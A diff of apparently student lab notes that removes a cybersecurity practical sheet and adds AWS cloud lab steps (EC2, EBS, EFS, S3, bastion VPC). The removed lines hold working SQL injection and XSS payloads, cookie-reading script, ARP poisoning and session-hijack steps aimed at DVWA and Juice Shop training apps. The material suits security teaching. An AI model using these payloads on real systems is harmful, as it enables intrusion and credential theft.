@@ -1,930 +1,967 @@
-DVWA: docker run -it -p 8080:80 vulnerables/web-dvwa
-JS:docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
+========================================================
+========================================================
 
+Launch an EC2 Instance and Connect
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-FIREWALL
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-firewall.py
-import requests
-import csv
-import subprocess
+========================================================
+========================================================
+========================================================
+PART A — Launch Linux EC2 Instance
+========================================================
 
-# Feodo Tracker IP Blocklist URL
-url = "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
+Step 1:
+Login to AWS Console / AWS Academy Learner Lab.
 
-# Download CSV file
-response = requests.get(url)
+Step 2:
+Choose Region:
+• Asia Pacific (Mumbai)
+OR
+• N. Virginia
 
-# Delete old firewall rules named "BadIP"
-subprocess.run(
-[
-"powershell",
-"-Command",
-"netsh advfirewall firewall delete rule name='BadIP'"
-]
-)
+Step 3:
+Go to:
+Services → EC2 → Launch Instance
 
-# Read CSV while ignoring comment lines starting with '#'
-mycsv = csv.reader(
-filter(
-lambda x: not x.startswith("#"),
-response.text.splitlines()
-)
-)
+Step 4:
+Configure Instance:
+1. Name: My_VS1
+2. AMI: Ubuntu / Amazon Linux
+3. Architecture: Default 64-bit (x86)
+4. Instance Type: t3.micro
+5. Create New Key Pair
+• Type: RSA
+• Format: .pem
+6. Keep default network/storage settings
+7. Click Launch Instance
 
-# Process each row
-for row in mycsv:
+========================================================
+PART B — Connect Using SSH
+========================================================
 
-# Extract destination IP column
-ip = row[1].strip()
+Step 1:
+Open Terminal / PowerShell / Git Bash
 
-# Skip header row
-if ip != "dst_ip":
+Step 2:
+Go to key location:
 
-# Outbound block rule
-rule_out = (
-f"netsh advfirewall firewall add rule "
-f"name='BadIP' "
-f"dir=out "
-f"action=block "
-f"remoteip={ip}"
-)
+cd Downloads
 
-# Inbound block rule
-rule_in = (
-f"netsh advfirewall firewall add rule "
-f"name='BadIP' "
-f"dir=in "
-f"action=block "
-f"remoteip={ip}"
-)
+Step 3:
+Give permission to key:
 
-# Execute firewall rules
-subprocess.run(["powershell", "-Command", rule_out])
-subprocess.run(["powershell", "-Command", rule_in])
+chmod 400 mykey.pem
 
-print(f"[+] Blocked IP: {ip}")
+Step 4:
+Connect to Ubuntu EC2:
 
-print("\nAll malicious IPs have been blocked.")
+ssh -i mykey.pem ubuntu@<Public-IP>
 
-Install Required Package
-pip install requests
+For Amazon Linux:
 
-Run the Script
-Run Command Prompt or PowerShell as Administrator:
+ssh -i mykey.pem ec2-user@<Public-IP>
 
-python firewall.py
+Step 5:
+Connected Successfully
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-PASSWORD STRENGTH CHECK
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-import java.util.Scanner;
+========================================================
+PART C — Connect Using PuTTY
+========================================================
 
-public class PasswordStrengthChecker {
+Step 1:
+Install PuTTY and PuTTYgen
 
-public static String checkPasswordStrength(String password) {
+Step 2:
+Convert .pem to .ppk
+1. Open PuTTYgen
+2. Click Load
+3. Select .pem file
+4. Click Save Private Key
+5. Save as keyname.ppk
 
-int strength = 0;
+Step 3:
+Open PuTTY
 
-// Length check
-if (password.length() >= 8) {
-strength++;
-}
+Host Name:
 
-// Uppercase check
-if (password.matches(".*[A-Z].*")) {
-strength++;
-}
+ubuntu@<Public-IP>
 
-// Lowercase check
-if (password.matches(".*[a-z].*")) {
-strength++;
-}
+OR
 
-// Number check
-if (password.matches(".*[0-9].*")) {
-strength++;
-}
+ec2-user@<Public-IP>
 
-// Special character check
-if (password.matches(".*[!@#$%^&*(),.?\":{}|<>].*")) {
-strength++;
-}
+Step 4:
+Attach .ppk Key
+Go to:
 
-// Strength evaluation
-if (strength == 5) {
-return "Very Strong Password";
-}
-else if (strength == 4) {
-return "Strong Password";
-}
-else if (strength == 3) {
-return "Medium Password";
-}
-else if (strength == 2) {
-return "Weak Password";
-}
-else {
-return "Very Weak Password";
-}
-}
+Connection → SSH → Auth → Credentials
 
-public static void main(String[] args) {
+Browse and select .ppk file
 
-Scanner sc = new Scanner(System.in);
+Step 5:
+Click Open
 
-System.out.print("Enter Password: ");
-String password = sc.nextLine();
+Connected Successfully
 
-String result = checkPasswordStrength(password);
+========================================================
+PART D — Connect Using AWS CloudShell
+========================================================
 
-System.out.println("Password Strength: " + result);
+Step 1:
+Open CloudShell in AWS Console
 
-sc.close();
-}
-}
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-PACKET SNIFFING AND NETWORK TRAFFIC ANALYSIS
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-# Open terminal and start HTTP server
-python3 -m http.server 8080
+Step 2:
+Upload .pem file
 
-# Open another terminal and start packet capture
-sudo tcpdump -i any -w capture.pcap port 8080
+Step 3:
+Run:
 
-# Open browser and access
-http://localhost:8080
+chmod 400 mykey.pem
 
-# Stop capturing using
-Ctrl + C
+Step 4:
+Connect:
 
-# Open capture file in Wireshark
-wireshark capture.pcap
+ssh -i mykey.pem ubuntu@<Public-IP>
 
-# Apply filter in Wireshark
-http.request.method == "GET"
+OR
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-SQL Injection Attack
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-# Install DVWA
-sudo apt update
-sudo apt install dvwa -y
+ssh -i mykey.pem ec2-user@<Public-IP>
 
-# Start services
-sudo service apache2 start
-sudo service mysql start
+Connected Successfully
 
-# Open DVWA
-http://127.0.0.1/dvwa
+========================================================
+PART E — Launch Windows EC2 and Connect Using RDP
+========================================================
 
-# Normal Input
-1
+Step 1:
+Launch Windows EC2 Instance
+• Select Windows Server AMI
+• Instance Type: t2.micro
+• Allow RDP Port 3389
+• Download .pem key
 
-# Authentication Bypass
-1' OR '1'='1
+Step 2:
+Get Administrator Password
+EC2 → Connect → RDP Client → Get Password
 
-# Find Columns
-1' ORDER BY 1-- -
-1' ORDER BY 2-- -
-1' ORDER BY 3-- -
+Upload .pem file and decrypt password
 
-# UNION Injection
-1' UNION SELECT 1,2-- -
+Step 3:
+Open Remote Desktop
 
-# Database Name
-1' UNION SELECT database(),2-- -
+mstsc
 
-# Table Names
-1' UNION SELECT table_name,2
-FROM information_schema.tables
-WHERE table_schema=database()-- -
-
-# Column Names
-1' UNION SELECT column_name,2
-FROM information_schema.columns
-WHERE table_name='users'-- -
-
-# Extract Usernames and Passwords
-1' UNION SELECT user,password FROM users-- -
-
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Finding & Exploiting XSS Vulnerabilities using DVWA on Kali Linux
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-# Start Apache
-sudo service apache2 start
-
-# Start MySQL
-sudo service mysql start
-
-http://localhost/dvwa
-
-<!-- Reflected XSS -->
-<script>alert('XSS')</script>
-
-<!-- Stored XSS -->
-<h1>Hacked</h1>
-
-<script>alert('Stored XSS')</script>
-
-<!-- DOM XSS -->
-#<script>alert('DOM XSS')</script>
-
-<!-- Cookie Demo -->
-<script>alert(document.cookie)</script>
-
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Testing Authentication Weaknesses and Session Management Using Kali Linux & DVWA
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-#Step 1:
-Start services.
-
-sudo service apache2 start
-sudo service mysql start
-
-#Step 2:
-Open:
-http://127.0.0.1/dvwa
+Step 4:
+Enter Public IP / DNS
 
 Login:
-Username: admin
-Password: password
+Username: Administrator
+Password: Decrypted Password
 
-#Step 3:
-Set DVWA Security Level = LOW.
+Connected Successfully
 
-#Step 4:
-Open:
-DVWA → Vulnerabilities → Brute Force
+========================================================
 
-Try:
-admin / admin
-admin / 123456
-admin / password
+========================================================
+========================================================
 
-#Step 5:
-Check Cookies:
-Inspect → Storage → Cookies
+CCLAB - 2
 
-#Step 6:
-Copy PHPSESSID.
-Open Private Window (Ctrl + Shift + P).
-Paste same PHPSESSID and refresh page.
+EBS Volume Management and EC2 Scaling in AWS
 
-#Step 7:
-Check PHPSESSID before and after login.
+========================================================
+========================================================
 
-#Step 8:
-Logout from DVWA.
-Reuse old PHPSESSID in Private Window.
+========================================================
+Create Volume → Attach → lsblk → fdisk → mkfs → mkdir → mount → fstab → reboot
+========================================
+AWS EBS VOLUME ATTACHMENT AND PERSISTENCE
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Ettercap
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+STEP 4 : VERIFY ATTACHED DISK
+Command:
+lsblk
 
-# Check IP Address
-ifconfig
+Expected Output:
 
-IP Address:
-192.168.0.103
+Root Volume : nvme0n1
+New EBS Disk : nvme1n1
 
-# Open Ettercap
-ettercap -G
+STEP 5 : CREATE PARTITION
+Command:
+sudo fdisk /dev/nvme1n1
 
-# Scan for Hosts
-Hosts → Scan for Hosts
+Inside fdisk enter:
 
-# Open Hosts List
-Hosts → Hosts List
+n
+p
+1
 
-# Add Devices
-Add to Target 1
-Add to Target 2
+w
 
-# View Current Targets
-Targets → Current Targets
+Explanation:
+n -> Create new partition
+p -> Primary partition
+1 -> Partition number
+w -> Save changes
 
-# Start ARP Poisoning
-MITM → ARP Poisoning
 
-# Enable
-Sniff Remote Connections
+STEP 6 : VERIFY PARTITION
+Command:
+lsblk
 
-# Start Attack
-Click OK
+Expected Output:
+nvme1n1
+└─nvme1n1p1
 
-# Observation
-ARP poisoning attack starts between victims.
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-TESTING IoT DEVICE SECURITY (DEFAULT PASSWORDS & OPEN PORTS)
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+STEP 7 : FORMAT PARTITION WITH XFS
+Command:
+sudo mkfs.xfs /dev/nvme1n1p1
 
-A. DEPLOY VULNERABLE IoT SIMULATION (DOCKER)
+Verify Filesystem:
+lsblk -fs
 
-docker run -d -p 8090:3000 --name juiceshop bkimminich/juice-shop
-docker ps
-docker logs juiceshop
+Expected:
+nvme1n1p1 xfs
 
 
-B. ACCESS APPLICATION (VERIFY DEPLOYMENT)
+STEP 8 : CREATE MOUNT DIRECTORY
+Command:
+sudo mkdir /mnt/cseb
 
-http://localhost:8090
 
+STEP 9 : MOUNT THE VOLUME
+Command:
+sudo mount /dev/nvme1n1p1 /mnt/cseb
 
-C. IDENTIFY HOST IP ADDRESS
+Verify Mount:
+df -h
 
-Windows:
-ipconfig
+Expected:
+Filesystem Size Used Avail Mounted on
+/dev/nvme1n1p1 100G ... ... /mnt/cseb
 
-Linux/macOS:
-ifconfig
 
+STEP 10 : MAKE MOUNT PERSISTENT
+Get UUID:
+sudo blkid /dev/nvme1n1p1
 
-D. NETWORK SCANNING FROM KALI LINUX
+Example Output:
+/dev/nvme1n1p1: UUID="e14d4020-d4f3-4f88-bd4c-89aa97aca41a" TYPE="xfs"
 
-nmap 10.39.169.126
-nmap -sV 10.39.169.126
-nmap -A 10.39.169.126
+Edit fstab:
+sudo nano /etc/fstab
 
+Add this line at the end:
 
-E. PORT + SERVICE ENUMERATION
+UUID=e14d4020-d4f3-4f88-bd4c-89aa97aca41a /mnt/cseb xfs defaults,nofail 0 0
 
-nmap -p- 10.39.169.126
-nmap -sC -sV 10.39.169.126
-nmap --open 10.39.169.126
+Save and Exit:
+CTRL + O
+ENTER
+CTRL + X
 
+Test fstab:
+sudo mount -a
 
-F. ACCESS IoT DASHBOARD FROM ATTACKER MACHINE
+If no error appears -> configuration is correct.
 
-http://10.39.169.126:8090
+Verify:
+df -h
 
 
-G. TEST DEFAULT / WEAK CREDENTIALS
+STEP 11 : CREATE FILE IN EBS VOLUME
+Go to mounted directory:
+cd /mnt/cseb
 
-admin / admin
-admin / password
-user / user
+Create file:
+sudo touch testfile.txt
 
+Add content:
+echo "EBS Volume Persistence Test" | sudo tee testfile.txt
 
-H. ANALYZE NETWORK TRAFFIC
+Verify:
+cat testfile.txt
 
-Open Browser
-Press F12
-Go to Network Tab
-Reload page
-Inspect HTTP requests
+Expected Output:
+EBS Volume Persistence Test
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-ANALYSING ANDROID APP PERMISSIONS AND MOBILE TRAFFIC
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-A.VERIFY
-1.C:\Users\Admin>cd C:\Users\Admin\AppData\Local\Android\Sdk\emulator
-2.C:\Users\Admin\AppData\Local\Android\Sdk\emulator>emulator -list-avds
+STEP 12 : UNMOUNT BEFORE DETACH
+Command:
+sudo umount /mnt/cseb
 
-B.SETUP PROXY
-1.cd C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools
-2.adb devices
-3.adb shell settings put global http_proxy 10.0.2.2:8080
-4.adb shell settings get global http_proxy
+Verify:
+df -h
 
-C.SEND CERTIFICATE TO EMULATOR
-1.C:\Users\Admin\AppData\Local\Android\Sdk\platform-tools>adb push C:\Users\Admin\Downloads\burpcer.der /sdcard/Download/
 
+DETACH VOLUME FROM AWS CONSOLE
+Open EC2 Dashboard
+Click Volumes
+Select EBS Volume
+Actions -> Detach Volume
+Wait until state becomes:
+available
 
-E. INSTALL CERTIFICATE IN EMULATOR
+ATTACH VOLUME TO ANOTHER EC2 INSTANCE
+Select same EBS Volume
+Actions -> Attach Volume
+Select another EC2 instance
+Device name:
+/dev/sdf
+Wait until state becomes:
+in-use
 
-Settings → Security → Install Certificate → Select burpcer.der
+ON SECOND EC2 INSTANCE
+Check attached disk:
+lsblk
 
+Expected:
+nvme1n1
+└─nvme1n1p1
 
-F. ANALYZE APP TRAFFIC
 
-Open Android application
-Observe requests in Burp Suite
+CREATE NEW MOUNT DIRECTORY
+Command:
+sudo mkdir /mnt/archana
 
 
-G. CHECK APP PERMISSIONS
+MOUNT EXISTING EBS VOLUME
+Command:
+sudo mount /dev/nvme1n1p1 /mnt/archana
 
-Settings → Apps → App Permissions
 
+VERIFY DATA PERSISTENCE
+Go to directory:
+cd /mnt/archana
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-WEB APPLICATION VULNERABILITY SCANNING WITH OWASP ZAP
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+List files:
+ls
 
-STEP 1 — Install OWASP ZAP
-Download and install OWASP ZAP from:
-https://www.zaproxy.org/download/
+Expected:
+testfile.txt
 
-STEP 2 — Run OWASP Juice Shop
-Open Command Prompt:
+Read file:
+cat testfile.txt
 
-docker run -d -p 3000:3000 bkimminich/juice-shop
+Expected Output:
+EBS Volume Persistence Test
+========================================================
 
-STEP 3 — Open Juice Shop
-Open browser:
+========================================================
 
-http://localhost:3000
+========================================================
+========================================================
 
-STEP 4 — Start OWASP ZAP
-1. Open OWASP ZAP
-2. Select:
-No, I do not want to persist this session
-3. Click Start
+CCLAB - 3
 
-STEP 5 — Configure Proxy
-Set browser proxy:
+EFS
 
-HTTP Proxy : 127.0.0.1
-Port : 8080
+========================================================
+========================================================
 
-STEP 6 — Perform Spider Scan
-1. Right-click:
-http://localhost:3000
-2. Select:
-Attack → Spider
-3. Start Scan
+========================================================
+========================================
+STEP 1 : LAUNCH EC2 INSTANCES
+Create 2 EC2 Instances:
 
-STEP 7 — Perform Active Scan
-1. Right-click:
-http://localhost:3000
-2. Select:
-Attack → Active Scan
-3. Start Scan
+EFS-1
 
-STEP 8 — Analyze Alerts
-Open Alerts tab to view vulnerabilities like:
-• XSS
-• Missing Security Headers
-• Cookie Issues
+AMI: Amazon Linux
+Instance Type: t2.micro
+Key Pair: kgf
+Subnet: us-east-1a
+EFS-2
 
-STEP 9 — Generate Report
-Go to:
-Report → Generate Report
-Save report in HTML/PDF format.
+Same configuration
+Subnet: us-east-1c
+Security Group Rules:
+SSH -> Port 22 -> Anywhere
+NFS -> Port 2049 -> Anywhere
 
+========================================
+STEP 2 : CREATE EFS FILE SYSTEM
+Open AWS Console
+Go to EFS
+Click Create File System
+Select:
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-CREATING AND ANALYZING DISK IMAGES USING dc3dd AND AUTOPSY
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-A. OPEN TERMINAL
-1.Ctrl + Alt + T
+Default VPC
+In Network Settings:
 
-B. CREATE SAMPLE EVIDENCE
-1.echo "Cybersecurity Lab Evidence" > evidence.txt
-2.ls
+Remove default SG
+Add created NFS Security Group
+Create File System
+========================================
+STEP 3 : CONNECT TO EC2 INSTANCES
+SSH Command:
+ssh -i kgf.pem ec2-user@
 
-C. IDENTIFY DISK PARTITION
-1.lsblk
+Switch to root:
+sudo su
 
-D. CREATE PRACTICE DISK IMAGE
-1.dd if=/dev/zero of=practice_disk.dd bs=1M count=100
+Create directory:
+mkdir efs
 
-E. FORMAT / MOUNT DISK
-1.mkfs.ext4 practice_disk.dd
+Install EFS Utilities:
+yum install -y amazon-efs-utils
 
-F. CREATE FORENSIC IMAGE USING dc3dd
-1.sudo dc3dd if=practice_disk.dd of=forensic_image.dd hash=md5 log=acquisition.log
+Verify:
+ls
 
-G. VERIFY IMAGE AND LOG
-1.ls -lh practice_disk.dd
-2.cat acquisition.log
+========================================
+STEP 4 : ATTACH EFS TO EC2 INSTANCES
+Mount Command:
+sudo mount -t efs -o tls fs-04ec940b87616695f:/ efs
 
-H. START AUTOPSY TOOL
-1.autopsy
+Verify:
+ls
 
-I. ACCESS AUTOPSY IN BROWSER
-1.http://localhost:9999/autopsy
+========================================
+STEP 5 : TEST EFS
+Go to EFS Directory:
+cd efs
 
-J. (INSIDE AUTOPSY - GUI STEPS, NOT COMMANDS)
-1.Create New Case
-2.Add Host
-3.Add Image → Select:
-4./home/kali/forensic_image.dd
+Create File:
+touch fs
 
-K. OPTIONAL (USEFUL ADDITIONAL COMMANDS FOR ANALYSIS)
-1.pwd
-2.whoami
-3.df -h
-4.file forensic_image.dd
-5.md5sum forensic_image.dd
+Verify:
+ls
 
+Expected Output:
+fs
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Cross-Site Scripting (XSS) using Juice Shop and Burp Suite
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-STEP 1 — Run OWASP Juice Shop
+========================================
+STEP 6 : VERIFY FILE SHARING
+On Second EC2 Instance:
 
-Pull Docker Image:
-docker pull bkimminich/juice-shop
+Go to mounted EFS:
+cd efs
 
-Run Container:
-docker run -d -p 3000:3000 bkimminich/juice-shop
+List Files:
+ls
 
-Open:
-http://localhost:3000
+Expected:
+fs
 
-STEP 2 — Configure Burp Suite Proxy
+This confirms:
 
-1. Open Burp Suite
-2. Go to:
-Proxy → Options
-3. Set Proxy Listener:
-127.0.0.1 : 8081
+EFS is successfully mounted
+File sharing works between both EC2 instances
+========================================
+========================================================
 
-Configure browser proxy:
-HTTP Proxy : 127.0.0.1
-Port : 8081
+========================================================
+========================================================
 
-STEP 3 — Identify XSS Vulnerability
+CCLAB - 4
 
-1. Open Juice Shop
-2. Find input fields like:
-• Search bar
-• Login form
-• Feedback form
+S3
 
-3. In Burp Suite:
-Proxy → HTTP History
+========================================================
+========================================================
 
-4. Send request to Repeater
+========================================================
 
-5. Test payload:
-<script>alert("XSS")</script>
+========================================
+PART 1 : AMAZON S3 BUCKET CREATION
+STEP 1 : CREATE BUCKET
+Open AWS Console
+Go to S3 Service
+Click Create Bucket
+Enter:
 
-6. Click Send and observe response.
+Bucket Name : salaar-public-bucket
+Region : N. Virginia
+Settings:
 
-STEP 4 — Exploit XSS in Feedback Form
+Enable ACLs
+Uncheck Block All Public Access
+Enable Bucket Versioning
+Click:
+Create Bucket
 
-1. Open Feedback/Contact Us page
-2. Enter payload:
-<script>alert("XSS")</script>
+Bucket created successfully.
 
-3. Submit form
 
-4. Alert popup confirms XSS vulnerability.
+STEP 2 : ENABLE PUBLIC ACCESS
+Open Bucket
+Go to Permissions Tab
+Open Access Control List (ACL)
+Edit
+Under Public Access:
 
-STEP 5 — Perform Stored XSS
+Everyone (public access) → Read
+Save Changes
 
-Payload:
-<script>document.write('<img src=x onerror=alert("Stored XSS")>')</script>
 
-1. Enter payload in review/feedback field
-2. Submit form
-3. Reload page
-4. Stored alert popup appears
+STEP 3 : UPLOAD FILE
+Open Bucket
+Click Upload
+Select File
+Permissions:
 
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-Testing Authentication Weaknesses and Session Management using Dockerized OWASP Juice Shop on Kali Linux
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+ACL Read Access Enabled
+Click Upload
+File uploaded successfully.
 
-STEP 1 — Install Docker
 
+STEP 4 : VERIFY VERSIONING
+Upload same file again
+Go to Versions
+Different versions of the same file are displayed.
+
+========================================
+PART 2 : S3 REPLICATION
+STEP 1 : CREATE DESTINATION BUCKET
+Change AWS Region
+Create another bucket
+Settings:
+
+ACL Enabled
+Uncheck Block Public Access
+Enable Versioning
+Bucket created successfully.
+
+
+STEP 2 : CREATE REPLICATION RULE
+Open Source Bucket
+Go to Management Tab
+Open Replication Rules
+Click Create Rule
+Enter:
+
+Rule Name
+Select:
+
+Apply to all objects
+Destination:
+
+Choose destination bucket
+IAM Role:
+
+Select LabRole
+Click:
+Save
+
+
+STEP 3 : TEST REPLICATION
+Upload PDF file into Source Bucket
+Open Destination Bucket
+Result:
+Uploaded file automatically appears in destination bucket.
+
+========================================
+PART 3 : STATIC WEBSITE HOSTING
+STEP 1 : CREATE STATIC WEBSITE BUCKET
+Open S3
+Click Create Bucket
+Enter:
+
+Bucket Name :
+my-static-site-bucket-123
+Settings:
+
+ACL Enabled
+Uncheck Block All Public Access
+Create Bucket
+
+
+STEP 2 : UPLOAD WEBSITE FILES
+Upload:
+
+index.html
+error.html
+Steps:
+
+Open Bucket
+Click Upload
+Add Files
+Upload
+
+STEP 3 : ENABLE STATIC WEBSITE HOSTING
+Open Properties Tab
+Scroll to Static Website Hosting
+Click Edit
+Enable
+Enter:
+
+Index Document : index.html
+Error Document : error.html
+Save Changes
+
+
+STEP 4 : ENABLE PUBLIC ACCESS
+BUCKET LEVEL ACL:
+Open Permissions
+Access Control List (ACL)
+Edit
+Enable:
+
+Everyone (public access) → Read
+Save
+
+OBJECT LEVEL ACL:
+Repeat for:
+
+index.html
+error.html
+Steps:
+
+Open Object
+Permissions
+ACL
+Edit
+Enable Public Read
+Save
+
+STEP 5 : ACCESS WEBSITE
+Open Properties
+Scroll to Static Website Hosting
+Copy Website Endpoint
+Example:
+http://my-static-site-bucket-123.s3-website-region.amazonaws.com
+
+Paste URL in browser.
+
+Result:
+index.html page opens successfully.
+
+
+STEP 6 : TEST ERROR PAGE
+Open invalid URL:
+
+http://bucket-name.s3-website-region.amazonaws.com/invalid.html
+
+Result:
+error.html page is displayed successfully.
+
+
+========================
+index.html
+==========
+
+<!DOCTYPE html>
+
+<html>
+<head>
+<title>My Static Website</title>
+
+```
+<style>
+body{
+background-color:#f2f2f2;
+font-family:Arial;
+text-align:center;
+padding-top:100px;
+}
+
+h1{
+color:#2c3e50;
+font-size:45px;
+}
+
+p{
+color:#555;
+font-size:22px;
+}
+
+.box{
+background:white;
+width:60%;
+margin:auto;
+padding:40px;
+border-radius:10px;
+box-shadow:0px 0px 10px gray;
+}
+</style>
+```
+
+</head>
+
+<body>
+
+```
+<div class="box">
+<h1>Welcome to My AWS S3 Website</h1>
+
+<p>
+Static Website Hosting using Amazon S3
+</p>
+
+<p>
+Cloud Computing Lab Experiment
+</p>
+</div>
+```
+
+</body>
+</html>
+
+========================
+error.html
+==========
+
+<!DOCTYPE html>
+
+<html>
+<head>
+<title>Error Page</title>
+
+```
+<style>
+body{
+background-color:#ffe6e6;
+font-family:Arial;
+text-align:center;
+padding-top:120px;
+}
+
+h1{
+color:red;
+font-size:50px;
+}
+
+p{
+font-size:22px;
+color:#333;
+}
+
+a{
+text-decoration:none;
+color:blue;
+font-size:20px;
+}
+</style>
+```
+
+</head>
+
+<body>
+
+```
+<h1>404 Error</h1>
+
+<p>
+Oops! The page you are looking for does not exist.
+</p>
+
+<a href="index.html">
+Back to Home
+</a>
+```
+
+</body>
+</html>
+
+
+===========================================================
+=============================================================
+AWS BASTION HOST + PRIVATE DATABASE SETUP (COMPLETE GUIDE)
+
+========================================================
+========================================================
+
+VPC CONFIGURATION
+========================================================
+VPC:
+Name: myvpc
+CIDR: 10.0.0.0/16
+
+Subnets:
+Public Subnet (Bastion):
+
+Name: PublicSubnet
+CIDR: 10.0.1.0/24
+Private Subnet (DB):
+
+Name: PrivateSubnet
+CIDR: 10.0.2.0/24
+========================================================
+2. INTERNET GATEWAY
+Create Internet Gateway
+Attach to myvpc
+========================================================
+3. ROUTE TABLES
+Public Route Table:
+
+Destination: 0.0.0.0/0 → Internet Gateway
+Associate: PublicSubnet
+Private Route Table:
+
+Destination: 10.0.0.0/16 → local
+Associate: PrivateSubnet
+========================================================
+4. SECURITY GROUPS
+
+A) BASTION SECURITY GROUP
+Inbound Rules:
+
+SSH | Port 22 | Source: My IP
+Outbound Rules:
+
+All traffic | 0.0.0.0/0
+
+B) DATABASE SECURITY GROUP
+Inbound Rules:
+
+SSH | Port 22 | Source: 10.0.1.0/24 (Bastion subnet)
+MYSQL/Aurora | Port 3306 | Source: 10.0.2.0/24
+Outbound Rules:
+
+All traffic | 0.0.0.0/0
+========================================================
+5. EC2 INSTANCE CONFIGURATION
+
+BASTION INSTANCE
+Subnet: PublicSubnet
+Auto-assign Public IP: Enabled
+Security Group: Bastion SG
+Key Pair: bastion.pem
+
+DATABASE INSTANCE
+Subnet: PrivateSubnet
+Auto-assign Public IP: Disabled
+Security Group: DB SG
+Key Pair: ebs_test_key.pem
+========================================================
+6. CONNECTIVITY FLOW
+Windows PC
+↓ SSH
+Bastion Host (Public Subnet)
+↓ SSH (Private IP)
+Database Server (Private Subnet)
+
+========================================================
+7. CONNECTION COMMANDS
+
+Step 1: Connect to Bastion
+ssh -i bastion.pem ubuntu@<BASTION_PUBLIC_IP>
+
+
+Step 2: Copy DB Key to Bastion
+scp -i bastion.pem ebs_test_key.pem ubuntu@<BASTION_PUBLIC_IP>:/home/ubuntu/
+
+
+Step 3: Fix Permissions in Bastion
+chmod 400 ebs_test_key.pem
+
+
+Step 4: Connect to DB Server
+ssh -i ebs_test_key.pem ec2-user@10.0.2.26
+
+========================================================
+8. DATABASE ADMINISTRATION TASKS
+
+Install MySQL
+sudo yum update -y
+sudo yum install mysql-server -y
+
+(or Ubuntu)
 sudo apt update
-sudo apt install docker.io -y
-sudo systemctl start docker
-sudo systemctl enable docker
+sudo apt install mysql-server -y
 
-Check version:
-docker --version
 
-STEP 2 — Run OWASP Juice Shop
+Start MySQL Service
+sudo systemctl start mysqld
 
-sudo docker run -d -p 3000:3000 --name juice-shop bkimminich/juice-shop
 
-Check container:
-sudo docker ps
+Check Status
+sudo systemctl status mysqld
 
-STEP 3 — Open Application
 
-http://localhost:3000
+Enable at Boot
+sudo systemctl enable mysqld
 
-STEP 4 — Configure Burp Suite
 
-1. Open Burp Suite
-2. Proxy → Intercept ON
-3. Configure browser proxy:
+Restart MySQL
+sudo systemctl restart mysqld
 
-IP : 127.0.0.1
-Port : 8080
+========================================================
+========================================================
 
-PART A — AUTHENTICATION TESTING
 
-Test 1: SQL Injection Login Bypass
+========================================================
+AWS NORMAL VPC SETUP (BASIC EC2 DEPLOYMENT)
 
-Email:
-' OR 1=1 --
+========================================================
 
-Password:
-anything
+VPC CREATION
+========================================================
+VPC:
+Name: NormalVPC
+CIDR Block: 10.0.0.0/16
+This VPC is used for a simple public EC2 setup (no Bastion, no private subnet).
 
-Result:
-Login bypass successful
+========================================================
+2. SUBNET CREATION
+Public Subnet:
 
-Inference:
-Application vulnerable to SQL Injection
+Name: PublicSubnet
+CIDR: 10.0.1.0/24
+Availability Zone: any (same region)
+========================================================
+3. INTERNET GATEWAY
+Create Internet Gateway
+Attach to NormalVPC
+========================================================
+4. ROUTE TABLE
+Public Route Table:
 
-Test 2: Weak Password Policy
+Destination: 0.0.0.0/0 → Internet Gateway
+Associate with PublicSubnet
+========================================================
+5. SECURITY GROUP
+Security Group Name: WebSG
 
-Password used:
-12345
+Inbound Rules:
 
-Inference:
-No strong password enforcement
+SSH | Port 22 | Source: My IP
+HTTP | Port 80 | Source: 0.0.0.0/0 (optional for web server)
+HTTPS | Port 443 | Source: 0.0.0.0/0 (optional)
+Outbound Rules:
 
-Test 3: Username Enumeration
+All traffic | 0.0.0.0/0
+========================================================
+6. EC2 INSTANCE SETUP
+Instance:
 
-1. Try valid email + wrong password
-2. Try invalid email + wrong password
+Name: Public-EC2
+AMI: Amazon Linux 2023
+Instance Type: t3.micro
+Key Pair: normal-key.pem (or any created key)
+Network Settings:
 
-Result:
-Different error messages displayed
+VPC: NormalVPC
+Subnet: PublicSubnet
+Auto-assign Public IP: Enabled
+Security Group: WebSG
+========================================================
+7. CONNECT TO INSTANCE
+From Windows:
 
-Inference:
-Valid usernames can be identified
+ssh -i "normal-key.pem" ec2-user@<PUBLIC_IP>
 
-PART B — SESSION MANAGEMENT TESTING
+========================================================
+8. OPTIONAL WEB SERVER SETUP
+Install Apache:
 
-Test 4: Session Cookie Analysis
+sudo yum update -y
+sudo yum install httpd -y
+sudo systemctl start httpd
+sudo systemctl enable httpd
 
-1. Login
-2. Open:
-F12 → Application → Cookies
+Test:
 
-Result:
-Session token visible
-
-Inference:
-Check Secure and HTTPOnly flags
-
-Test 5: Session Hijacking
-
-1. Copy session cookie
